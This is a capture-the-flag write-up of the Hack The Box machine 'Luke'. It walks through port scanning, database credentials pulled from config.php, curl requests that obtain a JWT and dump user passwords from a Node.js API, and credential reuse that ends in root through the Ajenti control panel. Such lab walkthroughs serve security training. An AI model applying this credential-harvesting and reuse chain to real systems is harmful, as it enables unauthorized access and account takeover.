@@ -1,0 +1,171 @@
+Luke 
+
+Rank - easy
+10.10.10.137
+
+Box Luke this was a nice easy BSD one so lets start the music as we always
+do by firing up nmap -
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.15.149
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session upload bandwidth limit
+|      No session download bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
+|_End of status
+22/tcp   open  ssh?
+80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
+|_http-title: Luke
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+8000/tcp open  http    Ajenti http control panel
+|_http-title: Ajenti
+
+
+So welcome to rabbit hole number 1 lol so many different attack surfaces see
+we have node.js running and also Ajenti a control panel use for webapps. So we
+start by checking out ssh nothing really we can do with that yet we move on
+to port 80. We also dive into FTP and take a look there as well.
+
+Digging around both on port 80 I found a web app and even a /management/ directory
+which took a username and password so figured lets look around the site and see
+if anything is around or exploitable.
+
+While digging found config.php for the webapp and found a set of database creds. 
+With no database port open we take a look at the node.js server and see what is
+going on there and maybe our creds will work for a jwt token.
+
+--------------------------------------------------------------------------------------------------]
+
+Creds found in config.php -
+
+$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; 
+$db = "login"; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: 
+%s\n". $conn -> error);
+
+--------------------------------------------------------------------------------------------------]
+
+So we now got a set of creds and we try to fuzz around on the higher port 3000 and see if they work
+on /management/ and they don't so we jump over to 3000 try them there using curl. By playing around
+and finally found a route in by submitting this request -
+
+--------------------------------------------------------------------------------------------------]
+
+curl --header "Content-Type: application/json" --request POST --data 
+'{"password":"Zk6heYCyv6ZE9Xcg","username":"admin"}' http://10.10.10.137:3000/login
+
+--------------------------------------------------------------------------------------------------]
+
+Notice /login at the end you always first dig around to find login portals to dish out a bearer token
+so we can use it and look thru the data.
+
+It then pushes out a jwt bearer token to us now lets try and use it on other paths we found including
+/users. The result will look like as so -
+
+-----------------------------------------------------------------------------------------------------]
+
+Output with our new token -
+
+{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5NzQ5MzYwLCJleHAiOjE1NTk4MzU3NjB9.-Dnk7Zk_PhbK1L8DgjFvq-O2uejujq0Kg6lTZFufP3Y"}
+
+-----------------------------------------------------------------------------------------------------]
+
+With our new token we again use it as our bearer token and submit the request like so at the end of the
+writeup will provide a link that explains how this process normally works we are just arming the process
+to see what else we can get to including more credentials possibly.
+
+------------------------------------------------------------------------------------------------------]
+
+Command to submit -
+
+curl -H 'Accept: application/json' -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5NzQ5MzYwLCJleHAiOjE1NTk4MzU3NjB9.-Dnk7Zk_PhbK1L8DgjFvq-O2uejujq0Kg6lTZFufP3Y" http://10.10.10.137:3000/users
+
+------------------------------------------------------------------------------------------------------]
+
+The output results in a jackpot we now see several sets of credentials now we can try port 8000 panel and
+even port 80 the /management/ portal. 
+
+Output -
+
+{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
+{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
+{"name":"Yuri","password":"bet@tester87"}
+{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
+
+
+
+As you can see we have plenty to work with and after trying each one we finally got a hit with 
+Derry user and his password on /management/. Digging around there looking for other ways and means
+we see no other way as creds don't work anywhere else. We do however stumble across config.json
+and by opening this file we find more creds at the bottom. 
+
+Creds that matched /management/ ------->
+
+{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
+
+Output of config.json ------------>
+
+{\"root\": \"/var/log\"}"
+ajenti.plugins.mysql.api.MySQLDB	"{\"password\": \"\", \"user\": \"root\", \"hostname\": \"localhost\"}"
+ajenti.plugins.fm.fm.FileManager	"{\"root\": \"/\"}"
+ajenti.plugins.tasks.manager.TaskManager	"{\"task_definitions\": []}"
+ajenti.users.UserManager	"{\"sync-provider\": \"\"}"
+ajenti.usersync.adsync.ActiveDirectorySyncProvider	"{\"domain\": \"DOMAIN\", \"password\": \"\", \"user\": \"Administrator\", \"base\": \"cn=Users,dc=DOMAIN\", \"address\": \"localhost\"}"
+ajenti.plugins.elements.usermgr.ElementsUserManager	"{\"groups\": []}"
+ajenti.plugins.elements.projects.main.ElementsProjectManager	"{\"projects\": \"KGxwMQou\\n\"}"
+password	"KpMasng6S5EtTy9Z"
+
+
+We can see at the bottom there we now have Administrator and a Password of "KpMasng6S5EtTy9Z" so we are
+once again off to see which portal these ones belong and lo and behold they matched port :8000. We
+then login and we see the Ajenti control panel so lets see what we can do here including upload a shell
+maybe?
+
+Nope went from zero to hero here by clicking on one of the options to open a terminal right in the 
+control panel. 
+
+# ls
+
+.cshrc
+.sujournal
+boot
+etc
+libexec
+net
+...........................>
+
+# id
+uid=0(root) gid=0(wheel) groups=0(wheel)
+
+Wait lol ok so we are now root congrats you now just rooted Luke
+so we now grab our flags -
+
+# cd /home/derry
+# cat user.txt
+58d441e500e8941f9c***********
+# cat /root/root.txt
+8448343028fadde1e2***********
+
+Ok we are done here :)
+
+#Hacktheplanet
+
+C-3P0
+
+Working with bearer jwt tokens reference - https://medium.com/@nieldw/using-curl-to-authenticate-with-jwt-bearer-tokens-55b7fac506bd
+
+---------------------------------------------------------------------------------------------]
